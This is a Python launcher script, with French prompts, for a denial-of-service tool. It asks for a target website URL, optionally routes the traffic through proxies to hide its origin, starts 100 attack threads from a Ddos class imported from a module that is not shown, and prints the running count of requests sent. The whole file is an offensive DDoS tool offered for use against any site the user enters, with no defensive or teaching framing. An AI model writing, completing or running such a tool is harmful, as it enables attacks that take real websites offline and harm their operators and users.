from backend.proxy import Proxy
from backend.ddos import Ddos
from validator_collection import checkers
import time


if __name__ == "__main__":
    url = None
    numberthread = 100
    with_proxy = None
    proxies = Proxy()

    while checkers.is_url(url) is False:
        url = input("Merci d'entrée l'url à DDOS exemple: https://siteweb.fr => ")
    
    while True:
        with_proxy = input("Veux tu utilisé des proxys pour lancer l'attaque: Oui ou Non => ")
        try:
            with_proxy = with_proxy[0].lower()
            if with_proxy == "n" or with_proxy == "o":
                break
        except IndexError:
            print("Merci d'inséré quelque chose oui ou non !")


    i=0
    mydict ={}
    while 1:
        if i < numberthread:
            if with_proxy == "o":
                mydict["thread"+str(i)] = Ddos(url, proxies.proxies_list)
            elif with_proxy == "n":
                mydict["thread"+str(i)] = Ddos(url)
            mydict["thread"+str(i)].start()
            print("création du thread numéro:", i+1)
            i +=1
        elif i == numberthread:
            print("tous les threads sont créer l'attaque est en cours")
            i +=1
        else:
            time.sleep(10)
            numreq =0
            for request in mydict.values():
                numreq += request.numbers_request
            print("Attaque ddos en cours ", str(numreq), "ont déjà été envoyer\n")
            print("CTRL + C pour arreter l'attaque")
